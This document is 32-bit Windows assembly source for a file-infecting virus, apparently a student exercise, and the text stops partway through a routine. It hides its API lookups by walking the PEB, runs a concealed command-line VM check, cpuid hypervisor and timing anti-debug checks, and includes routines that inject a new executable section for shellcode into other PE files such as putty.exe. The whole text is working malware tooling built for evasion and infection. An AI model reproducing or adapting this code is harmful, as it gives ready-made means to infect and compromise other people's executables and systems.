format PE gui
use32
entry _start

.text:
    mov ebp, esp; for correct debugging

_start:
    push ebp
    mov ebp, esp
    sub esp, 0x10 ; -> 4 stack for local variable

    ; push 1000
    ; call Sleep


    ; push 0          ; putty.exe
    ; push 0x65
    ; push 0x78652e79
    ; push 0x74747570
    ; mov eax, esp

    ; push 0          ; .SHELL
    ; push 0x4c4c
    ; push 0x4548532e
    ; mov ebx, esp

    ; push 0         ; raw_shellcode.raw
    ; push 0x77
    ; push 0x61722e65
    ; push 0x646f636c
    ; push 0x6c656873
    ; push 0x5f776172
    ; mov ecx, esp

    ; push ecx
    ; push ebx
    ; push eax
    ; call AddSection

    

    ; call CheckVM_Hypervisor ; check vmware by cpuid
    ; cmp eax, 1
    ; je .exit

    call CheckVM_CheckProcess ; vmtools
    cmp eax, 0
    jg .exit 


    call timeGetTime
    mov [ebp-0x4], eax
    call timeGetTime
    mov [ebp-0x8], eax

    mov ebx, [ebp-0x8]
    mov ecx, [ebp-0x4]
    sub ebx, ecx
    cmp ebx, 1000 ; 1000 ms
    jge .exit

    call Infect
    
    call showPopUp

    .exit:
        call ExitProcess

showPopUp:
    push ebp
    mov ebp, esp

    sub esp, 0x8

    push 0      ; 18521205 - 18520401 - 17521254
    push 0x3435
    push 0x32313235
    push 0x3731202d
    push 0x20313034
    push 0x30323538
    push 0x31202d20
    push 0x35303231
    push 0x32353831
    mov [ebp-0x4], esp

    push 0    ; Virus
    push 0x73
    push 0x75726956
    mov [ebp-0x8], esp

    mov ebx, [ebp-0x4]
    mov ecx, [ebp-0x8]

    push ecx
    push ebx
    call messageBox
    add esp, 0x8 ; free args

    add esp, 0xc ; free virus string
    add esp, 0x24 ; free 18521205 - 18520401 - 17521254 string


    add esp, 0x8
    pop ebp
    ret

messageBox:
    push ebp
    mov ebp, esp

    sub esp, 0x8

    push 0         ; MessageBoXaA
    push 0x41786f
    push 0x42656761
    push 0x7373654d
    mov  [ebp-0x4], esp

    push 0; user32.dll
    push 0x6c6c
    push 0x642e3233
    push 0x72657375
    mov [ebp-0x8], esp

    mov ebx, [ebp-0x4] ; MessageBoxA
    mov ecx, [ebp-0x8]; user32.dll

    push ebx
    push ecx
    call CallAPI
    add esp, 0x8 ; free arg
    add esp, 0x10 ; free user32.dll string
    add esp, 0x10 ; free MessageBoxA string

    mov ecx, [ebp+0x8]; message
    mov edx, [ebp+0xc]; caption

    push 0; MB_OK
    push edx ; caption
    push ecx ; message
    push 0; null -> hwdn
    call eax

    add esp, 0x8 ; clear stack
    pop ebp
    ret

CallAPI:

    push ebp
    mov ebp, esp

    sub esp, 0x8

    ; **** load dll at [ebp+0x8] *****

    ; Load LoadLibraryA address from kernel32.dll

    push 0          ;; LoadLibraryA
    push 0x41797261
    push 0x7262694c
    push 0x64616f4c
    mov edx, esp

    push 0xd
    push edx
    call LoadKernel32Function ; LoadLibraryA address
    add esp, 0x8 ; free arg
    add esp, 0x10 ; free LoadLibraryA string

    ; load dll from ebp+0x8 by LoadLibraryA
    mov ecx, [ebp+0x8] ; dll file
    push ecx
    call eax ; LoadLibraryA address
    mov [ebp-0x4], eax  ; dll address

    ;;;;; END load dll *****

    ; Load GetProcAddress address from kernel32.dll
    push 0 ; GetProcAddress
    push 0x7373
    push 0x65726464
    push 0x41636f72
    push 0x50746547
    mov edx, esp

    push 0xf
    push edx
    call LoadKernel32Function ; GetProcAddress address stored at eax
    add esp, 0x8 ; free agrs
    add esp, 0x14; free GetProcAddress string

    ; Load adress of funtion
    mov ecx, [ebp+0xc] ; api name
    mov edx, [ebp-0x4] ; dll address

    push ecx ; push api name
    push edx ; dll address
    call eax ; GetProcAddress address

    add esp, 0x8 ; free stack = free 6 stack tuong ung voi 6 push

    pop ebp
    ret


LoadKernel32Function:
    ;push ebp
;    mov ebp, esp

    ; Save all registers
   ; push ebx
;    push ecx
;    push edx
;    push esi
;    push edi

    ; Establish a new stack frame
    push ebp
    mov ebp, esp

    sub esp, 18h                        ; Allocate memory on stack for local variables

    mov ebx, [ebp+0x8] ; function name
    mov [ebp-4], ebx

    ; Find kernel32.dll base address
    xor esi, esi                        ; esi = 0
    mov ebx, [fs:30h + esi]     ; written this way to avoid null bytes
    mov ebx, [ebx + 0x0C]
    mov ebx, [ebx + 0x14]
    mov ebx, [ebx]
    mov ebx, [ebx]
    mov ebx, [ebx + 0x10]               ; ebx holds kernel32.dll base address
    mov [ebp-8], ebx            ; var8 = kernel32.dll base address

    ; Find function address
    mov eax, [ebx + 3Ch]                ; RVA of PE signature
    add eax, ebx                ; Address of PE signature = base address + RVA of PE signature
    mov eax, [eax + 78h]                ; RVA of Export Table
    add eax, ebx                        ; Address of Export Table

    mov ecx, [eax + 24h]                ; RVA of Ordinal Table
    add ecx, ebx                        ; Address of Ordinal Table
    mov [ebp-0Ch], ecx          ; var12 = Address of Ordinal Table

    mov edi, [eax + 20h]                ; RVA of Name Pointer Table
    add edi, ebx                        ; Address of Name Pointer Table
    mov [ebp-10h], edi          ; var16 = Address of Name Pointer Table

    mov edx, [eax + 1Ch]                ; RVA of Address Table
    add edx, ebx                        ; Address of Address Table
    mov [ebp-14h], edx          ; var20 = Address of Address Table

    mov edx, [eax + 14h]                ; Number of exported functions

    xor eax, eax                        ; counter = 0


    .loop:
        mov edi, [ebp-10h]      ; edi = var16 = Address of Name Pointer Table
        mov esi, [ebp-4]        ; esi = var4 = your function
        xor ecx, ecx

        cld                     ; set DF=0 => process strings from left to right
        mov edi, [edi + eax*4]  ; Entries in Name Pointer Table are 4 bytes long
                                        ; edi = RVA Nth entry = Address of Name Table * 4
        add edi, ebx            ; edi = address of string = base address + RVA Nth entry
        ;add cx, 8              ; Length of strings to compare (len('WinExec') = 8)
        mov ecx, [ebp+0xc]
        repe cmpsb              ; Compare the first 8 bytes of strings in
                                        ; esi and edi registers. ZF=1 if equal, ZF=0 if not
        jz LoadKernel32Function.found

        inc eax                 ; counter++
        cmp eax, edx            ; check if last function is reached
        jb LoadKernel32Function.loop            ; if not the last -> loop

        jmp LoadKernel32Function.end            ; if function is not found, jump to end

    .found:
        ; the counter (eax) now holds the position of WinExec

        mov ecx, [ebp-0Ch]      ; ecx = var12 = Address of Ordinal Table
        mov edx, [ebp-14h]      ; edx = var20 = Address of Address Table

        mov ax, [ecx + eax*2]   ; ax = ordinal number = var12 + (counter * 2)
        mov eax, [edx + eax*4]  ; eax = RVA of function = var20 + (ordinal * 4)
        add eax, ebx            ; eax = address of WinExec =
                                        ; = kernel32.dll base address + RVA of WinExec


        ;ret

    .end:
        ;pop ebp                ; restore all registers and exit
;        pop edi
;        pop esi
;        pop edx
;        pop ecx
        add esp, 18h; ; clear the stack
        pop ebp

        ret

timeGetTime:
    push ebp
    mov ebp, esp

    sub esp, 0x8

    push 0        ; timeGetTimeName
    push 0x656d69
    push 0x54746547
    push 0x656d6974
    mov [ebp-0x4], esp

    push 0         ; Winmm.dll
    push 0x6c
    push 0x6c642e6d
    push 0x6d6e6957
    mov [ebp-0x8], esp

    mov eax, [ebp-0x4]; timeGetTime
    mov ebx, [ebp-0x8]; Winmm.dll

    push eax
    push ebx
    call CallAPI
    add esp, 0x8 ; free args

    add esp, 0x10 ; free Winmm.dll string
    add esp, 0x10 ; free timeGetTime string

    call eax ; timeGetTime address

    add esp, 0x8
    pop ebp
    ret

ExitProcess:
    push ebp
    mov ebp, esp

    sub esp, 0x8

    push 0        ; ExitProcess
    push 0x737365
    push 0x636f7250
    push 0x74697845
    mov [ebp-0x4], esp

    mov eax, [ebp-0x4]
    push  0xc ; len
    push eax
    call LoadKernel32Function

    add esp, 0x8 ; free agrs
    add esp, 0x10 ; free ExitProcess string

    push 0 ; uExitCode
    call eax

    add esp, 0x8
    pop ebp
    ret

CheckVM_Hypervisor:
    push ebp
    mov ebp, esp

    mov eax, 0x40000000
    cpuid

    ; get result from cpuid
    push 0
    push edx
    push ecx
    push ebx
    mov edx, esp

    push 0         ; Microsoft Hv
    push 0x76482074
    push 0x666f736f
    push 0x7263694d
    mov ecx, esp

    mov esi, 0x0
    ; compare two string in ecx, edx
    .loop:
        mov al, [ecx + esi] ; microsolf
        mov bl, [edx + esi]
        cmp al, bl
        jne .not_equal

        cmp al, 0
        je .equal

        inc esi
        jmp .loop

    .not_equal:
        mov eax, 1

        add esp, 0x10 ; free stack
        add esp, 0x10 ; free stack Microsoft Hv string
        pop ebp

        ret
    .equal:
        mov eax, 0

        add esp, 0x10 ; free stack result cpuid
        add esp, 0x10 ; free stack Microsoft Hv string
        pop ebp

        ret

CheckVM_CheckProcess:
    push ebp
    mov ebp, esp


    push 0          ; "cmd /c tasklist | findstr vmtoolsd.exe > tasklist.txt"
    push 0x74
    push 0x78742e74
    push 0x73696c6b
    push 0x73617420
    push 0x3e206578
    push 0x652e6473
    push 0x6c6f6f74
    push 0x6d762072
    push 0x7473646e
    push 0x6966207c
    push 0x20747369
    push 0x6c6b7361
    push 0x7420632f
    push 0x20646d63
    mov eax, esp
           ;******* Check VM using check vmtoolsd.exe process *******

       ;**** run tasklist in cmd and check vmtoolsd.exe then write result to tasklist.txt
    push 0 ; SW_HIDE
    push eax ; "cmd /c tasklist | findstr vmtoolsd.exe > tasklist.txt"
    call WinExec
    add esp, 0x8 ; free args
    add esp, 0x3c ; free "cmd /c tasklist | findstr vmtoolsd.exe > tasklist.txt" string
    ;xor eax, eax

       ; wait 1 second for cmd command complete
    push 1000 ; 1000 milisecond
    call Sleep ; 
    add esp, 0x4

       ; Check size tasklist.txt, if size > 0 -> exits vmtoolsd.exe -> VM

    push 0          ; tasklist.txt
    push 0x7478742e
    push 0x7473696c
    push 0x6b736174
    mov eax, esp 

    push 0 ; hTempFile
    push 0x80 ; FILE_ATTRIBUTE_NORMAL -> dwFlagsAndAttributes
    push 0x3 ; OPEN_EXISTING -> dwCreationDisposition
    push 0 ; lpSecurityAttributes
    push 0 ; dwShareMode
    push 0x80000000; GENERIC_READ -> dwDesiredAccess
    push eax ; tasklist.txt -> lpFileName
    call CreateFileA
    add esp, 0x1c ; free args 
    add esp, 0x10 ; free tasklist.txt string

    push eax
    call GetFileSize
    add esp, 0x4 ; free args

    pop ebp
    ret ; if size >0 => vmtoolsd.exe exist => vm
    ;;;;;;; end Check VM using check vmtoolsd.exe process *********


WinExec:
    push ebp
    mov ebp, esp

    push 0         ; WinExec
    push 0x636578
    push 0x456e6957
    mov eax, esp

    push 0x8 ; len
    push eax
    call LoadKernel32Function
    add esp, 0x8 ; free args
    add esp, 0xc ; free WinExc string

    mov ecx, [ebp+0x8] ; uCmdShoe
    mov edx, [ebp+0xc] ; command

    push edx
    push ecx
    call eax

    pop ebp
    ret

CreateFileA:
    push ebp
    mov ebp, esp


    push 0         ; CreateFileA
    push 0x41656c
    push 0x69466574
    push 0x61657243
    mov eax, esp

    push 0xc  ; len
    push eax
    call LoadKernel32Function

    add esp, 0x8 ; free args
    add esp, 0x10 ; free CreateFileA string

    mov ebx, [ebp+0x20] ; hTemplateFile
    push ebx

    mov ebx, [ebp+0x1c] ; dwFlagsAndAttributes
    push ebx

    mov ebx, [ebp+0x18] ; dwCreationDisposition
    push ebx

    mov ebx, [ebp+0x14] ; lpSecurityAttributes
    push ebx

    mov ebx, [ebp+0x10] ; dwShareMode
    push ebx

    mov ebx, [ebp+0xc] ; dwDesiredAccess
    push ebx

    mov ebx, [ebp+0x8] ; lpFileName
    push ebx

    call eax

    pop ebp
    ret

CloseHandle:
    push ebp
    mov ebp, esp

    push 0         ; CloseHandle
    push 0x656c64
    push 0x6e614865
    push 0x736f6c43
    mov eax, esp

    push 0xc ; len
    push eax
    call LoadKernel32Function

    add esp, 0x8 ; free args
    add esp, 0x10 ; free CloseHandle string

    mov ebx, [ebp+0x8] ; file handle
    push ebx
    call eax

    pop ebp
    ret

Sleep:
    push ebp
    mov ebp, esp

    push 0         ; Sleep
    push 0x70
    push 0x65656c53
    mov eax, esp

    push 0x6 ; len
    push eax
    call LoadKernel32Function

    add esp, 0x8 ; free args
    add esp, 0xc ; free Sleep string

    mov ebx, [ebp+0x8] ; dwMiliseconds
    push ebx
    call eax

    pop ebp
    ret

SetFilePointer:
    push ebp
    mov ebp, esp

    push 0         ; SetFilePointer
    push 0x7265
    push 0x746e696f
    push 0x50656c69
    push 0x46746553
    mov eax, esp

    push 0xf ; len
    push eax
    call LoadKernel32Function

    add esp, 0x8 ; free args
    add esp, 0x14 ; free SetFilePointer string

    mov ebx, [ebp+0x8]
    mov ecx, [ebp+0xc]
    mov edx, [ebp+0x10]
    mov esi, [ebp+0x14]

    push esi
    push edx
    push ecx
    push ebx
    call eax

    pop ebp
    ret

VirtualAlloc:
    push ebp
    mov ebp, esp

    push 0          ; VirtualAlloc
    push 0x636f6c6c
    push 0x416c6175
    push 0x74726956
    mov eax, esp

    push 0xd ; len
    push eax
    call LoadKernel32Function

    add esp, 0x8; free args
    add esp, 0x10 ; free VirtualAlloc String

    mov ebx, [ebp+0x08] ; lpAddress
    mov ecx, [ebp+0xc] ; dwSize
    mov edx, [ebp+0x10] ; flAlloctionType
    mov esi, [ebp+0x14] ; flProctect

    push esi
    push edx
    push ecx
    push ebx
    call eax

    pop ebp
    ret

WriteFile:
    push ebp
    mov ebp, esp

    push 0          ; WriteFile
    push 0x65
    push 0x6c694665
    push 0x74697257
    mov eax, esp

    push 0xa ; len
    push eax
    call LoadKernel32Function

    add esp, 0x8 ; free args
    add esp, 0x10 ; free WriteFile

    mov ebx, [ebp+0x8] ; hFile
    mov ecx, [ebp+0xc] ; lpBuffer
    mov edx, [ebp+0x10] ; nNumberOfBytesToWrite
    mov esi, [ebp+0x14] ; nNumberOfBytesToWrite
    mov edi, [ebp+0x18] ; lpOverlapped

    push edi
    push esi
    push edx
    push ecx
    push ebx
    call eax

    pop ebp
    ret

ReadFile:
    push ebp
    mov ebp, esp

    push 0         ; ReadFile
    push 0x656c6946
    push 0x64616552
    mov eax, esp

    push 0x9  ; len
    push eax
    call LoadKernel32Function

    add esp, 0x8 ; free args
    add esp, 0xc ; free ReadFile string

    mov ebx, [ebp+0x8] ; hFile
    mov ecx, [ebp+0xc] ; lpBuffer
    mov edx, [ebp+0x10] ; nNumberOfBytesToWrite
    mov esi, [ebp+0x14] ; nNumberOfBytesToWrite
    mov edi, [ebp+0x18] ; lpOverlapped

    push edi
    push esi
    push edx
    push ecx
    push ebx
    call eax

    pop ebp
    ret

GetFileSize:
    push ebp
    mov ebp, esp

    push 0         ; GetFileSize
    push 0x657a69
    push 0x53656c69
    push 0x46746547
    mov eax, esp

    push 0xc
    push eax
    call LoadKernel32Function

    add esp, 0x8 ; free args
    add esp, 0x10 ; free GetFileSize string

    mov ebx, [ebp+0x8] ; HANDLE
    push 0 ; lpFileSizeHigh
    push ebx
    call eax ; GetFileSize

    pop ebp
    ret

FindSection: ; filepath, section name -> return index section unless return -1 (0xffffffff)
    push ebp
    mov ebp, esp

    ; mov eax, [ebp+0xc]
    ; mov ebx, [ebp+0x8]

    ; push eax
    ; push ebx 
    ; call messageBox

    sub esp, 0x18 ; 0x4 -> File Handle
                        ; 0x8 ->  offset NT header, 0xc
                        ; 0xc -> number of section
                        ; 0x10 -> counter = index of current section
                        ; 0x18 : address of current section name 

    ; mov ebx, [ebp+0x8]
    ; mov ecx, [ebp+0xc]
    ; push ecx            ;  notification files what is added section
    ; push ebx 
    ; call messageBox
    ; add esp, 0x8 ; free args

    mov ebx, [ebp+0x8]
    push 0 ; hTempFile
    push 0x80 ; FILE_ATTRIBUTE_NORMAL -> dwFlagsAndAttributes
    push 0x3 ; OPEN_EXISTING -> dwCreationDisposition
    push 0 ; lpSecurityAttributes
    push 0 ; dwShareMode
    push 0xC0000000; GENERIC_READ | GENERIC_WRITE -> dwDesiredAccess
    push ebx ; lpFileName
    call CreateFileA
    add esp,0x1c; free stack

    mov [ebp-0x4], eax ; File handle
    mov ecx, [ebp-0x4]  ;  File handle

        ; get NT offset
    push 0
    push 0
    push 0x3c
    push ecx ;
    call SetFilePointer
    add esp,0x10; free stack

    xor eax, eax
    mov [ebp-0x8], eax ; clear [ebp-0xc], avoid exception beacause ReaFile just read 2byte, stack have 4 byte
    lea ebx, [ebp - 0x8] ; pointer to offset NT header
    mov ecx, [ebp-0x4]  ;  File handle

    push 0
    push 0
    push 0x2
    push ebx
    push ecx
    call ReadFile
    add esp,0x14; free stack

    ; *** start read number of section
    mov ebx, [ebp - 0x8]
    add ebx, 0x06
    mov ecx, [ebp-0x4]

    push 0 ; -> dwMoveMethod
    push 0 ; -> lpDistanceToMoveHigh
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    xor eax, eax
    mov [ebp-0xc], eax ; clear [ebp-0xc], avoid exception beacause ReaFile just read 2byte, stack have 4 byte
    lea edx, [ebp-0xc] ; pointer to number of section
    mov ecx, [ebp-0x4] ; file handle
    push 0
    push 0
    push 0x2
    push edx
    push ecx
    call ReadFile
    add esp,0x14; free stack
    ; ;;; End Read number of section

    ; *** start find section
    xor edx, edx; => counter
    mov [ebp-0x10], edx
    .loop:
        mov esi, [ebp-0xc] ; number of section
        mov edx, [ebp-0x10] ; counter
        cmp edx, esi
        jge .not_found

        mov edx, [ebp-0x10] ; edx'th section
        mov ebx, [ebp-0x8] ; offset NT header
        add ebx, 0xf8
        mov eax, 0x28
        mul edx ; eax = eax*edx => eax = 0x28 * edx
        add ebx, eax

        mov ecx, [ebp-0x4] ; file handle

        push 0; FILE_BEGIN
        push 0;
        push ebx
        push ecx
        call SetFilePointer
        add esp,0x10; free stack

        sub esp, 0x8
        mov [ebp-0x18], esp 
        mov edx, esp ; repair stack for section name

        mov ecx, [ebp-0x4] ; file handle
        ;lea edx, [ebp-0x18] ; save name section
        push 0;
        push 0;
        push 0x8
        push edx
        push ecx
        call ReadFile
        add esp,0x14; free stack

        ; compare two string
        ; khong dung repe cmpsb vi khong hieu sao
        ; no khong so sanh dung
        mov edi, [ebp-0x18] ; name of current section
        mov esi, [ebp+0xc] ; name of section what nead to find
        
        push 0x8
        push esi  
        push edi
        call CmpStr
        add esp, 0xc ; free args

        add esp, 0x8 ; free space from save section name

        cmp eax, 0
        je .found ; ZF=0 -> 2 section string equal

        mov edx, [ebp-0x10] ; increase counter
        inc edx
        mov [ebp-0x10], edx
        jmp .loop

    .not_found:
        mov ebx, [ebp-0x4] ; file handle
        push ebx
        call CloseHandle
        add esp, 0x4 ; free arg

        mov eax, 0xffffffff ; -1
        add esp, 0x18 ; free local variable
        pop ebp
        ret

    .found:
        mov ebx, [ebp-0x4] ; file handle
        push ebx
        call CloseHandle
        add esp, 0x4 ; free arg

        mov eax, [ebp-0x10] ; index of current section
        add esp, 0x18 ; free local variable
        pop ebp
        ret
    ;;; end find name section


GetLenStr: ; str1 -> len
    push ebp
    mov ebp, esp

    mov edx, [ebp+0x8]
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx

    .loop:
        mov al, [edx+ecx]
        cmp al, bl ; compare al to null
        je .end

        inc ecx
        jmp .loop
    .end:
        mov eax, ecx
        pop ebp
        ret

    
CmpStr: ; str1, str2, len to compare -> equal return 0
    push ebp
    mov ebp, esp 

    mov esi, [ebp+0x8] ; str1
    mov edi, [ebp+0xc] ; str2
    mov edx, [ebp+0x10] ; len to compare
    xor ecx, ecx ; counter
    xor ebx, ebx
    .loop:
        cmp ecx, edx
        je .equal

        mov al, [esi + ecx]
        mov bl, [edi + ecx]
        cmp al, bl
        jne .not_equal        

        inc ecx
        jmp .loop
    .not_equal:
        mov eax, 1
        pop ebp
        ret

    .equal:
        mov eax, 0
        pop ebp
        ret


AddSection:       ; file path, name section, file shellcode -> Return old entrypoint
    push ebp
    mov ebp, esp

    ; mov eax, [ebp+0xc]
    ; mov ebx, [ebp+0x8]

    ; push eax
    ; push ebx 
    ; call messageBox

    sub esp, 0x18 ; 0x4 -> File Handle
                        ; 0x8 ->  offset NT header, 0xc
                        ; 0xc -> number of section
                        ; 0x10, 0x14 -> temp
                        ; 0x18 : save old entry point

    mov ebx, [ebp+0x8]
    mov ecx, [ebp+0xc]
    push ecx            ;  notification files what is added section
    push ebx 
    call messageBox
    add esp, 0x8 ; free args

    mov ebx, [ebp+0x8]
    push 0 ; hTempFile
    push 0x80 ; FILE_ATTRIBUTE_NORMAL -> dwFlagsAndAttributes
    push 0x3 ; OPEN_EXISTING -> dwCreationDisposition
    push 0 ; lpSecurityAttributes
    push 0 ; dwShareMode
    push 0xC0000000; GENERIC_READ | GENERIC_WRITE -> dwDesiredAccess
    push ebx ; lpFileName
    call CreateFileA
    add esp,0x1c; free stack

    mov [ebp-0x4], eax ; File handle
    mov ecx, [ebp-0x4]  ;  File handle

        ; get NT offset
    push 0
    push 0
    push 0x3c
    push ecx ;
    call SetFilePointer
    add esp,0x10; free stack

    xor eax, eax
    mov [ebp-0x8], eax ; clear [ebp-0xc], avoid exception beacause ReaFile just read 2byte, stack have 4 byte
    lea ebx, [ebp - 0x8] ; pointer to offset NT header
    mov ecx, [ebp-0x4]  ;  File handle

    push 0
    push 0
    push 0x2
    push ebx
    push ecx
    call ReadFile
    add esp,0x14; free stack

    ; *** start read number of section
    mov ebx, [ebp - 0x8]
    add ebx, 0x06
    mov ecx, [ebp-0x4]

    push 0 ; -> dwMoveMethod
    push 0 ; -> lpDistanceToMoveHigh
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    xor eax, eax
    mov [ebp-0xc], eax ; clear [ebp-0xc], avoid exception beacause ReaFile just read 2byte, stack have 4 byte
    lea edx, [ebp-0xc] ; pointer to number of section
    mov ecx, [ebp-0x4] ; file handle
    push 0
    push 0
    push 0x2
    push edx
    push ecx
    call ReadFile
    add esp,0x14; free stack
    ; ;;; End Read number of section

    ; *** start add section

        ; Add name section

    mov edx, [ebp-0xc] ; number of section
    mov ebx, [ebp-0x8] ; offset NT header
    add ebx, 0xf8
    mov eax, 0x28
    mul edx ; eax = eax*edx => eax = 0x28 * edx
    add ebx, eax

    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    mov ecx, [ebp-0x4] ; file handle
    mov edx, [ebp+0xc] ; name section
    push 0;
    push 0;
    push 0x8
    push edx
    push ecx
    call WriteFile
    add esp,0x14; free stack
        ;;; end add name section

        ; *** start add virtualsize

            ; offsetNT + 0x78 + numberofsection*0x28 + 0x8
    mov edx, [ebp-0xc] ; number of section
    mov ebx, [ebp-0x8] ; offset NT header
    add ebx, 0xf8
    mov eax, 0x28
    mul edx ; eax = eax*edx => eax = 0x28 * edx
    add ebx, eax
    add ebx, 0x08

    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    push 0
    push 0x1000; section aligment
    push 6000; size section
    call align_address
    add esp, 0xc ; free stack

    push eax
    lea ebx, [esp] ; pointer to align

    mov ecx, [ebp-0x4]; file handle
    push 0;
    push 0;
    push 0x4
    push ebx
    push ecx
    call WriteFile
    add esp,0x14; free stack

         ; ;;; end add virtualsize

         ; *** start add virtual address
            ; read previous virtual size
    mov edx, [ebp-0xc] ; number of section
    mov ebx, [ebp-0x8] ; offset NT header
    add ebx, 0xf8
    mov eax, 0x28
    sub edx, 1
    mul edx ; eax = eax*edx => eax = 0x28 * (numofsection-1)
    add ebx, eax
    add ebx, 0x08

    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    lea ebx, [ebp - 0x10]; pointer to previouse virtualsize
    mov ecx, [ebp-0x4]; file handle

    push 0
    push 0
    push 0x4
    push ebx
    push ecx
    call ReadFile
    add esp,0x14; free stack

                ; read previous virtual address
    mov edx, [ebp-0xc] ; number of section
    mov ebx, [ebp-0x8] ; offset NT header
    add ebx, 0xf8
    mov eax, 0x28
    sub edx, 1
    mul edx ; eax = eax*edx => eax = 0x28 * (numofsection-1)
    add ebx, eax
    add ebx, 0xc

    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    lea ebx, [ebp - 0x14]; pointer to previouse virtual address
    mov ecx, [ebp-0x4]; file handle

    push 0
    push 0
    push 0x4
    push ebx
    push ecx
    call ReadFile
    add esp,0x14; free stack


            ; offsetNT + 0x78 + numberofsection*0x28 + 0x8
    mov edx, [ebp-0xc] ; number of section
    mov ebx, [ebp-0x8] ; offset NT header
    add ebx, 0xf8
    mov eax, 0x28
    mul edx ; eax = eax*edx => eax = 0x28 * edx
    add ebx, eax
    add ebx, 0xc

    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    mov ebx, [ebp-0x10]; previous virtual size
    mov ecx, [ebp-0x14]; previous virtual address

    push ecx
    push 0x1000;
    push ebx;
    call align_address
    add esp, 0xc ; free stack

    push eax
    lea ebx, [esp] ; pointer to align

    mov ecx, [ebp-0x4]; file handle
    push 0;
    push 0;
    push 0x4
    push ebx
    push ecx
    call WriteFile
    add esp,0x14; free stack
        ; ;;; end add virtual address


        ; *** start add size of raw data
            ; offsetNT + 0x78 + numberofsection*0x28 + 0x8
    mov edx, [ebp-0xc] ; number of section
    mov ebx, [ebp-0x8] ; offset NT header
    add ebx, 0xf8
    mov eax, 0x28
    mul edx ; eax = eax*edx => eax = 0x28 * edx
    add ebx, eax
    add ebx, 0x10

    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    push 0
    push 0x200; file aligment
    push 6000; size section
    call align_address
    add esp, 0xc ; free stack

    push eax
    lea ebx, [esp] ; pointer to align

    mov ecx, [ebp-0x4]; file handle
    push 0;
    push 0;
    push 0x4
    push ebx
    push ecx
    call WriteFile
    add esp,0x14; free stack
        ; ;;; End Add size of raw

        ; ** start add pointer to raw
            ; read previous size of raw data
    mov edx, [ebp-0xc] ; number of section
    mov ebx, [ebp-0x8] ; offset NT header
    add ebx, 0xf8
    mov eax, 0x28
    sub edx, 1
    mul edx ; eax = eax*edx => eax = 0x28 * (numofsection-1)
    add ebx, eax
    add ebx, 0x10

    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    lea ebx, [ebp - 0x10]; pointer to previouse virtualsize
    mov ecx, [ebp-0x4]; file handle

    push 0
    push 0
    push 0x4
    push ebx
    push ecx
    call ReadFile
    add esp,0x14; free stack

                ; read previous pointer to raw data
    mov edx, [ebp-0xc] ; number of section
    mov ebx, [ebp-0x8] ; offset NT header
    add ebx, 0xf8
    mov eax, 0x28
    sub edx, 1
    mul edx ; eax = eax*edx => eax = 0x28 * (numofsection-1)
    add ebx, eax
    add ebx, 0x14

    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    lea ebx, [ebp - 0x14]; pointer to previouse virtual address
    mov ecx, [ebp-0x4]; file handle

    push 0
    push 0
    push 0x4
    push ebx
    push ecx
    call ReadFile
    add esp,0x14; free stack


            ; offsetNT + 0x78 + numberofsection*0x28 + 0x8
    mov edx, [ebp-0xc] ; number of section
    mov ebx, [ebp-0x8] ; offset NT header
    add ebx, 0xf8
    mov eax, 0x28
    mul edx ; eax = eax*edx => eax = 0x28 * edx
    add ebx, eax
    add ebx, 0x14

    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    mov ebx, [ebp-0x10]; previous size of raw data
    mov ecx, [ebp-0x14]; previous pointer to raw data

    push ecx
    push 0x200;
    push ebx;
    call align_address
    add esp, 0xc ; free stack

    push eax
    lea ebx, [esp] ; pointer to align

    mov ecx, [ebp-0x4]; file handle
    push 0;
    push 0;
    push 0x4
    push ebx
    push ecx
    call WriteFile
    add esp,0x14; free stack
        ; ;;; end add pointer to raw data

        ; *** add characteristics
            ; offsetNT + 0x78 + numberofsection*0x28 + 0x8
    mov edx, [ebp-0xc] ; number of section
    mov ebx, [ebp-0x8] ; offset NT header
    add ebx, 0xf8
    mov eax, 0x28
    mul edx ; eax = eax*edx => eax = 0x28 * edx
    add ebx, eax
    add ebx, 0x24

    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    push 0xE00000E0 ; characteristics
    lea ebx, [esp] ; pointer to align

    mov ecx, [ebp-0x4]; file handle
    push 0;
    push 0;
    push 0x4
    push ebx
    push ecx
    call WriteFile
    add esp,0x14; free stack
        ; ;;; End add characteristics

        ; *** start add size of image
            ; read virtual address
    mov edx, [ebp-0xc] ; number of section
    mov ebx, [ebp-0x8] ; offset NT header
    add ebx, 0xf8
    mov eax, 0x28
    mul edx ; eax = eax*edx => eax = 0x28 * numofsection
    add ebx, eax
    add ebx, 0xC

    mov ecx, [ebp-0x4] ; file handle

    push 0; FILE_BEGIN
    push 0;
    push ebx
    push ecx
    call SetFilePointer
    add esp,0x10; free stack

    lea ebx, [ebp - 0x10]; pointer to virtual address
    mov ecx, [ebp-0x4]; file handle

    push 0
    push 0
    push 0x4
    push ebx
    push ecx
    call ReadFile
    add esp,0x14; free stack

                ; read vitual size
    mov edx, [ebp-0xc] ; number of section
    mov ebx, [ebp-0x8] ; offset NT header
    add ebx, 0xf8
    mov eax, 0x28
